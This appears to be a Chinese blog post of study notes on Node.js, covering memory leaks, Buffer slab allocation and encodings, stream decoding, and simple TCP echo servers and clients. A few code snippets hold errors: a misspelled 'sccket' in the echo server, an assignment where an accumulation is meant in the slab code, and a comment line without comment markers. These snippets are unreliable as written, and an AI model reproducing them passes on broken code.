<h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>一旦线上应用有成千上万的流量，那怕是一个字节的内存泄漏也会造成堆积，垃圾回收过程中将会耗费更多时间进行对象扫描，应用响应缓慢，直到进程内存溢出，应用崩溃。</p>
<p>内存泄漏通常产生于无意间，较难排查。尽管内存泄漏的情况不尽相同，但其实质只有一个，那就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。</p>
<p>通常由如下原因：</p>
<ol>
<li>缓存</li>
<li>队列消费不及时</li>
<li>作用域未释放</li>
</ol>
<h2 id="慎将内存当做缓存"><a href="#慎将内存当做缓存" class="headerlink" title="慎将内存当做缓存"></a>慎将内存当做缓存</h2><p>在Node中，一旦一个对象被当做缓存来使用，那就意味着它将会常驻在老生代中。</p>
<p>如果需要，只要限定缓存对象的大小，加上完整的过期策略以防止内存无限制增长，还是可以一用的</p>
<p>另一个案例在于模块机制。所有模块都会通过编译执行，然后被缓存起来。由于通过exports导出的函数，可以访问文件模块中的私有变量，这样每个文件模块在编译执行后形成的作用域因为模块缓存的原因，不会被释放<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> local = <span class="string">"局部变量"</span>;</span><br><span class="line"></span><br><span class="line">  exports.get = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> local;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>由于模块的缓存机制，模块是常驻老生代的。在设计模块时，要小心内存泄漏的出现。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> leakArray = [];</span><br><span class="line">exports.leak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  leakArray.push(<span class="string">'leak'</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>如果不可避免要这么设计，那么请添加清空队列的响应接口，以供调动者释放内存。</p>
<h2 id="缓存的解决方案"><a href="#缓存的解决方案" class="headerlink" title="缓存的解决方案"></a>缓存的解决方案</h2><p>直接将内存作为缓存的方案要十分慎重。除了限制缓存的大小外，另外要考虑的事情是，进程之间无法共享内存。这些缓存不可避免地有重复，对物理内存的使用是一种浪费。</p>
<p>目前较好的解决方案是采用进程外的缓存如Redis。外部的缓存软件有着良好的缓存过期淘汰策略以及自有的内存管理，不影响Node进程的性能且进程间可以共享缓存。</p>
<h2 id="关注队列状态"><a href="#关注队列状态" class="headerlink" title="关注队列状态"></a>关注队列状态</h2><p>队列（数组对象）在消费者-生产者模型中经常充当中间产物，如果消费者速度低于生产速度，将会形成堆积。</p>
<p>解决方案是监控队列的长队，一旦堆积，通过报警通知相关人员。另一个解决方案是设置超时机制，通过回调函数传递超时异常，给消费速度一个下限值。</p>
<h2 id="内存泄漏排查"><a href="#内存泄漏排查" class="headerlink" title="内存泄漏排查"></a>内存泄漏排查</h2><p>排查内存泄漏的原因主要通过对堆内存进行分析而找到的，有许多工具用来定位Node应用的内存泄漏，如node-heapdump和node-memwatch等。???暂略</p>
<h2 id="大内存应用"><a href="#大内存应用" class="headerlink" title="大内存应用"></a>大内存应用</h2><p>在Node中，不可避免地还是会存在操作大文件的场景。好在Node提供了stream模块用于处理大文件。Node中的大多数模块都有stream的应用。</p>
<p>由于V8的内存限制，我们无法通过fs.readFile和fs.writeFile直接进行大文件的操作，而改用fs.createReadStream和fs.createWriteStream方法通过流的方式实现对大文件的操作。</p>
<p>如果不需要进行字符串层面的操作，则不需要借助V8来处理，可以尝试进行纯粹的Buffer操作，这不会受到V8堆内存的限制。</p>
<h1 id="理解Buffer"><a href="#理解Buffer" class="headerlink" title="理解Buffer"></a>理解Buffer</h1><p>JavaScript对于字符串(string)的操作十分友好，无论是宽字节字符串还是单字节字符串，都被认为是一个字符串<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"0123456789"</span>.length);<span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"零一二三四五六七八九"</span>.length);<span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"\u00bd"</span>.length);<span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>在Node中，应用需要处理网络协议、操作数据库、处理图片、接收上传文件等，在网络和文件的操作中，还要处理大量二进制数据，JavaScript自有的字符串远远不能满足这些要求，于是Buffer对象应运而生</p>
<h2 id="Buffer结构"><a href="#Buffer结构" class="headerlink" title="Buffer结构"></a>Buffer结构</h2><p>Buffer是一个像Array的对象，但它主要用于操作字节。</p>
<h2 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h2><p>Buffer是典型的JavaScript与C++结合的模块，它将性能相关部分用C++实现，将非性能相关的部分用JavaScript实现。<br><img src="https://mfaying.github.io/static/images/node/51.jpg" alt="avatar"><br>Buffer所占用的内存不是通过V8分配的，属于堆外内存。</p>
<p>由于Buffer太过常见，Node在进程启动时就已经加载了它，并将其放在全局对象(global)上。所以无需require()即可直接使用。</p>
<h2 id="Buffer对象"><a href="#Buffer对象" class="headerlink" title="Buffer对象"></a>Buffer对象</h2><p>Buffer对象类似于数组，它的元素为16进制的两位数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"深入浅出node.js"</span>;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(str, <span class="string">'utf-8'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf);<span class="comment">// &lt;Buffer e6 b7 b1 e5 85 a5 e6 b5 85 e5 87 ba 6e 6f 64 65 2e 6a 73&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>Buffer受Array类型的影响很大，可以访问length属性得到长度，也可以通过下标访问元素，在构造对象时也十分相似<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf.length);<span class="comment">// 100</span></span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">10</span>]);<span class="comment">// 0-255的随机值</span></span><br><span class="line">buf[<span class="number">10</span>]=<span class="number">100</span>;</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">10</span>]);<span class="comment">// 100</span></span><br><span class="line">buf[<span class="number">10</span>]=<span class="number">-100</span>;</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">10</span>]);<span class="comment">// 156，赋值小于0，逐次加256</span></span><br><span class="line">buf[<span class="number">10</span>]=<span class="number">300</span>;</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">10</span>]);<span class="comment">// 44，大于255，逐次减256</span></span><br><span class="line">buf[<span class="number">10</span>]=<span class="number">3.1415</span>;</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">10</span>]);<span class="comment">// 3，小数，舍弃小数部分</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Buffer内存分配"><a href="#Buffer内存分配" class="headerlink" title="Buffer内存分配"></a>Buffer内存分配</h2><p>Buffer对象的内存分配不是在V8的堆内存中，是在Node的C++层面实现内存的申请的。因为处理大量的字节数据不能采用需要一点内存就向操作系统申请一点内存的方式，这可能造成大量的内存申请的系统调用，对操作系统有一定压力。为此Node在内存的使用上应用的是在C++层面申请内存、在JavaScript中分配内存的策略。</p>
<p>为了高效使用申请来的内存，Node采用了slab分配机制。slab是一种动态内存管理机制，简单而言，slab就是一块申请好的固定大小的内存区域。具有如下3种状态</p>
<ol>
<li>full: 完全分配</li>
<li>partial: 部分分配状态</li>
<li>empty: 没有被分配状态<br>当我们需要一个Buffer对象，可以通过以下方式分配指定大小的Buffer对象<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Buffer(size);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>Node以8KB为边界来区分Buffer是大对象还是小对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Buffer.poolSize = <span class="number">8</span> * <span class="number">1024</span>;</span><br></pre></td></tr></table></figure></p>
<p>这个8KB的值也就是每个slab的大小值，在JavaScript层面，以它作为单位单元进行内存的分配。</p>
<p>1.分配小Buffer对象</p>
<p>如果指定Buffer的大小少于8KB,Node会按照小对象的方式进行分配。Buffer的分配过程中主要使用一个局部变量pool作为中间处理对象，处于分配状态的slab单元都指向它。以下是分配一个全新的slab单元的操作，它会将新申请的SlowBuffer对象指向它：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pool;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocPool</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  pool = <span class="keyword">new</span> SlowBuffer(Buffer.poolSize);</span><br><span class="line">  pool.used = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/52.jpg" alt="avatar"></p>
<p>在图6-2中，slab处于empty状态<br>构造小Buffer对象时的代码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Buffer(<span class="number">1024</span>);</span><br></pre></td></tr></table></figure></p>
<p>这次构造将会去检查pool对象，如果pool没有被创建，将会创建一个新的slab单元指向它：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pool || pool.length - pool.used &lt; <span class="keyword">this</span>.length) allocPool();</span><br></pre></td></tr></table></figure></p>
<p>同时当前Buffer对象的parent属性指向该slab，并记录下是从这个slab的哪个位置(offset)开始使用的，slab对象自身也记录被使用了多少字节<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.parent = pool;</span><br><span class="line"><span class="keyword">this</span>.offset = pool.used;</span><br><span class="line">pool.used = <span class="keyword">this</span>.length;</span><br><span class="line"><span class="keyword">if</span> (pool.used &amp; <span class="number">7</span>) pool.used = (pool.used + <span class="number">8</span>) &amp; ~<span class="number">7</span>;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/53.jpg" alt="avatar"></p>
<p>这时候的slab状态为partial</p>
<p>当再次创建一个Buffer对象时，构造过程中将会判断这个slab的剩余空间是否足够。如果足够，使用剩余空间，并更新slab的分配状态。下面代码创建了一个新的Buffer对象，它会引起一次slab分配：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Buffer(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/54.jpg" alt="avatar"></p>
<p>如果slab剩余的空间不够，将会构造新的slab，原slab中剩余的空间会造成浪费。</p>
<p>这里要注意的事项是，由于同一个slab可能分配给多个Buffer对象使用，只有这些小Buffer对象在作用域释放并都可以回收时，slab的8KB空间才会被回收。</p>
<p>2.分配大Buffer对象</p>
<p>如果需要超过8KB的Buffer对象，将会直接分配一个SlowBuffer对象作为slab单元，这个slab单元将会被这个大Buffer对象独占<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Big buffer, just alloc one</span><br><span class="line"><span class="keyword">this</span>.parent = <span class="keyword">new</span> SlowBuffer(<span class="keyword">this</span>.length);</span><br><span class="line"><span class="keyword">this</span>.offset = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
<p>这里的SlowBuffer类是在C++中定义的，虽然引用Buffer模块可以访问到它，但是不推荐直接操作它。</p>
<p>上面提到的Buffer对象都是JavaScript层面的，能够被V8的垃圾回收标记回收。但是其内部的parent属性指向的SlowBuffer对象却来自Node自身C++中的定义，所用内存不在V8的堆中。</p>
<p>3.小结</p>
<p>当进行小而频繁的Buffer操作时，采用slab的机制进行预先申请和事后分配，使得JavaScript到操作系统之间不必有过多的内存申请方面的系统调用。对于大块的Buffer而言，则直接使用C++层面提供的内存，而无需细腻的分配操作。</p>
<h2 id="Buffer的转换"><a href="#Buffer的转换" class="headerlink" title="Buffer的转换"></a>Buffer的转换</h2><p>Buffer对象可以与字符串之间相互转换。目前支持的字符串编码类型如下：</p>
<ol>
<li>ASCII</li>
<li>UTF-8</li>
<li>UTF-16LE/UCS-2</li>
<li>Base64</li>
<li>Binary</li>
<li>Hex</li>
</ol>
<h2 id="字符串转Buffer"><a href="#字符串转Buffer" class="headerlink" title="字符串转Buffer"></a>字符串转Buffer</h2><p>主要通过构造函数完成：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Buffer(str, [encoding]);</span><br></pre></td></tr></table></figure></p>
<p>通过构造函数转换的Buffer对象，存储的只能是一种编码类型。encoding参数不传递时，默认按UTF-8编码进行转码和存储。</p>
<p>一个Buffer对象可以存储不同编码类型的字符串转码的值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">buf.write(string, [offset], [length], [encoding])</span><br></pre></td></tr></table></figure></p>
<p>需要小心的是，每种编码所用的字节长度不同，将Buffer反转回字符串时需要谨慎处理。</p>
<h2 id="Buffer转字符串"><a href="#Buffer转字符串" class="headerlink" title="Buffer转字符串"></a>Buffer转字符串</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">buf.toString([encoding], [start], [end]);</span><br></pre></td></tr></table></figure>
<h2 id="Buffer不支持的编码类型"><a href="#Buffer不支持的编码类型" class="headerlink" title="Buffer不支持的编码类型"></a>Buffer不支持的编码类型</h2><p>isEncoding()函数来判断编码是否支持转换<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Buffer.isEncoding(encoding);</span><br></pre></td></tr></table></figure></p>
<p>对于不支持的编码类型，可以借助Node生态圈中的模块完成转换。如iconv和iconv-lite。</p>
<h2 id="Buffer的拼接"><a href="#Buffer的拼接" class="headerlink" title="Buffer的拼接"></a>Buffer的拼接</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'test.md'</span>);</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">''</span>;</span><br><span class="line">rs.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">  data += chunk;</span><br><span class="line">&#125;);</span><br><span class="line">rs.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>data事件中获取的chunk对象即是Buffer对象。一旦输入流中有宽字节编码时，问题就会暴露出来。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data += chunk;</span><br></pre></td></tr></table></figure></p>
<p>这句代码里隐藏了toString()操作，等价于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data = data.toString() + chunk.toString();</span><br></pre></td></tr></table></figure></p>
<p>为了重现这个问题，我们将文件可读流的每次读取的Buffer长度限制为11<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'test.md'</span>, &#123;<span class="attr">highWaterMark</span>: <span class="number">11</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<p>输出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">床前明��光，疑���地上霜；举头��明月，���头思故乡。</span><br></pre></td></tr></table></figure></p>
<p>由于我们限定了Buffer对象的长度为11，而中文字在UTF-8下占3个字节。所以会形成一些乱码。</p>
<h2 id="setEncoding-与string-decoder"><a href="#setEncoding-与string-decoder" class="headerlink" title="setEncoding()与string_decoder()"></a>setEncoding()与string_decoder()</h2><p>可读流还有一个设置编码的方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">readable.setEncoding(encoding)</span><br></pre></td></tr></table></figure></p>
<p>该方法的作用是让data事件中传递的不再是一个Buffer对象，而是编码后的字符串。<br>我们修改之前的程序<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'test.md'</span>, &#123;<span class="attr">highWaterMark</span>: <span class="number">11</span>&#125;);</span><br><span class="line">rs.setEncoding(<span class="string">'utf8'</span>);</span><br></pre></td></tr></table></figure></p>
<p>输出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">床前明月光，疑是地上霜；举头望明月，低头思故乡。</span><br></pre></td></tr></table></figure></p>
<p>要知道，无论如何设置编码。触发data事件的次数依旧相同。这意味着设置编码并未改变按段读取的基本方式。</p>
<p>事实上，在调用setEncoding()时，可读流对象在内部设置了一个decoder对象。每次data事件都通过该decoder对象进行Buffer到字符串的解码，然后传递给调用者。是故设置编码后，data不再收到原始的Buffer对象。decoder对象来自于string_decoder模块StringDecoder的实例对象，它的神奇之处在于：<br><img src="https://mfaying.github.io/static/images/node/55.jpg" alt="avatar"></p>
<p>StringDecoder在得到编码后，知道宽字节字符串在UTF-8编码下是以3个字节的方式存储的，所以第一个write()时，只输出前9个字节转码形成的字符，“月”字的前两个字节被保留在StringDecoder实例内部。第二次write()时，会将这2个剩余字节和后续11个字节组合在一起，再次用3的整数倍数字节进行转码。</p>
<p>它目前只能处理UTF-8、Base64和UCS-2/UTF-16LE这三种比编码。能解决解决大部分的乱码问题，但并不能从根本上解决该问题。</p>
<h2 id="正确拼接Buffer"><a href="#正确拼接Buffer" class="headerlink" title="正确拼接Buffer"></a>正确拼接Buffer</h2><p>淘汰掉setEncoding方法后，剩下的解决方案只有将多个小Buffer对象拼接为一个Buffer对象，然后通过iconv-lite一类的模块来转码这种方式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> chunks = [];</span><br><span class="line"><span class="keyword">var</span> size = <span class="number">0</span>;</span><br><span class="line">res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">  chunks.push(chunk);</span><br><span class="line">  size += chunk.length;</span><br><span class="line">&#125;);</span><br><span class="line">res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> buf = Buffer.concat(chunks, size);</span><br><span class="line">  <span class="keyword">var</span> str = iconv.decode(buf, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(str);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>调用Buffer.concat()方法生成一个合并的Buffer对象。</p>
<h2 id="Buffer与性能"><a href="#Buffer与性能" class="headerlink" title="Buffer与性能"></a>Buffer与性能</h2><p>Buffer在文件I/O和网路I/O中运用广泛，在应用中，我们通常会操作字符串，但一旦在网络中传输，都需要转换为Buffer，以进行二进制数据传输。在web应用中，字符串转换到Buffer是时时刻刻发生的，提高字符串到Buffer的转换效率，可以很大程度地提高网络吞吐率。</p>
<p>测试<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> helloworld = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">10</span>; i ++) &#123;</span><br><span class="line">  helloworld += <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// helloworld = new Buffer(helloworld);</span></span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>);</span><br><span class="line">  res.end(helloworld);</span><br><span class="line">&#125;).listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure></p>
<p>通过ab做一个性能测试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ab -c 200 -t 100 http://127.0.0.1:8001/</span><br></pre></td></tr></table></figure></p>
<p>取消掉注释以后，性能提升近一倍。</p>
<p>通过预先转换静态内容为Buffer对象，可以有效减少CPU的重复使用，节省服务器资源。在Node构建构建的web应用中，可以选择将页面中的动态内容和静态内容分离，静态内容部分可以通过预先转换为Buffer的方式，使性能得到提升。</p>
<p>.文件读取</p>
<p>Buffer的使用除了与字符串的转换有性能损耗外，在文件的读取时，有一个highWaterMark设置对性能的影响至关重要。在fs.createReadStream(path, opts)时，我们可以传入一些参数，代码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  flags: <span class="string">'r'</span>,</span><br><span class="line">  encoding: <span class="literal">null</span>,</span><br><span class="line">  fd: <span class="literal">null</span>,</span><br><span class="line">  mode: <span class="number">0666</span>,</span><br><span class="line">  highWaterMark: <span class="number">64</span> * <span class="number">1024</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>还可以传递start和end来指定读取文件的位置范围<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">start</span>: <span class="number">90</span>, <span class="attr">end</span>: <span class="number">99</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>fs.createReadStream()的工作方式是在内存中准备一段Buffer，然后在fs.read()读取时逐步从磁盘中将字节复制到Buffer中。完成一次读取时，则从这个Buffer中通过slice()方法取出部分数据作为一个小的Buffer对象，再通过data事件传递给调用方。如果Buffer用完，则重新分配一个；如果还有剩余，则继续使用。下面为分配一个新的Buffer对象的操作：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pool;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocNewPool</span>(<span class="params">poolSize</span>) </span>&#123;</span><br><span class="line">  pool = <span class="keyword">new</span> Buffer(poolSize);</span><br><span class="line">  pool.used = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在理想情况下，每次读取的长度就是用户指定的highWaterMark。但是有可能读到了文件的结尾，或者文件本身就没有指定的highWaterMark那么大，这个预先指定的Buffer对象将会有部分剩余，不过好在这里的内存可以分配给下次读取时使用。pool是常驻内存的，只有当pool单元剩余数量小于128(kMinPoolSpace)字节时，才会重新分配一个新的Buffer对象。Node源码中分配新的Buffer对象的判断条件如下所示：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pool || pool.length - pool.used &lt; kMinPoolSpace) &#123;</span><br><span class="line">  <span class="comment">// discard the old pool</span></span><br><span class="line">  pool = <span class="literal">null</span>;</span><br><span class="line">  allocNewPool(<span class="keyword">this</span>._readableState.highWaterMark);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里与Buffer的内存分配比较类似，highWaterMark的大小对性能有两个影响</p>
<ol>
<li>highWaterMark设置对Buffer内存的分配和使用有一定影响</li>
<li>highWaterMark设置过小，可能导致系统调用次数过多</li>
</ol>
<p>文件流读取基于Buffer分配，Buffer则基于SlowBuffer分配，这可以理解为两个维度的分配策略。如果文件较小(小于8KB)，有可能造成slab未能完全使用。</p>
<p>由于fs.createReadStream()内部采用fs.read()实现，将会引起对磁盘的系统调用，对于大文件而言，highWaterMark的大小决定会触发系统调用和data事件的次数。</p>
<p>读取一个相同的大文件时，hightWaterMark值的越大，读取速度越快。</p>
<h1 id="网路编程"><a href="#网路编程" class="headerlink" title="网路编程"></a>网路编程</h1><p>Node只需要几行代码即可构建服务器，无需额外的容器。</p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP全名为传输控制层协议，在OSI模型(由七层组成)中属于传输层协议。<br><img src="https://mfaying.github.io/static/images/node/56.jpg" alt="avatar"></p>
<p>TCP是面向连接的协议，其显著的特征是在传输之前需要3次握手形成会话<br><img src="https://mfaying.github.io/static/images/node/57.jpg" alt="avatar"></p>
<p>只有会话形成之后，服务端和客户端之间才能互相发送数据。在创建会话的过程中，服务器端和客户端分别提供一个套接字，这两个套接字共同形成一个连接。服务器端与客户端则通过套接字实现两者之间连接的操作。</p>
<h2 id="创建TCP服务器端"><a href="#创建TCP服务器端" class="headerlink" title="创建TCP服务器端"></a>创建TCP服务器端</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = net.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 新的连接</span></span><br><span class="line">  socket.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    socket.write(<span class="string">'你好'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  socket.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'连接断开'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  socket.write(<span class="string">"welcome!"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">8124</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server bound'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们通过net.createServer(listener)即可创建一个TCP服务器，listener是连接事件connection的侦听器，也可以采用如下的方式进行侦听：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> server = net.createServer();</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 新的连接</span></span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8124</span>);</span><br></pre></td></tr></table></figure></p>
<p>除了端口外，同样我们也可以对Domain Socket进行监听<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.listen(<span class="string">'/tmp/echo.sock'</span>);</span><br></pre></td></tr></table></figure></p>
<p>测试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -U /tmp/echo.sock</span><br></pre></td></tr></table></figure></p>
<p>通过net模块构造客户端<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">var</span> client = net.connect(&#123;<span class="attr">port</span>: <span class="number">8124</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 'connect' listener</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'client connected'</span>);</span><br><span class="line">  client.write(<span class="string">'world!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data.toString());</span><br><span class="line">  client.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'client disconnected'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>如果是Domain Socket<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> client = net.connect(&#123;<span class="attr">path</span>: <span class="string">'/tmp/echo.sock'</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="TCP服务事件"><a href="#TCP服务事件" class="headerlink" title="TCP服务事件"></a>TCP服务事件</h2><p>在上述的示例中，代码分为服务器事件和连接事件<br><img src="https://mfaying.github.io/static/images/node/58.jpg" alt="avatar"></p>
<p>另外，由于TCP套接字是可写可读的Stream对象，可以利用pipe()方法巧妙地实现管道操作，如下代码实现了一个echo服务器<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = net.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  socket.write(<span class="string">'Echo server'</span>);</span><br><span class="line">  sccket.pipe(socket);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">1337</span>, <span class="string">'127.0.0.1'</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/59.jpg" alt="avatar"></p>
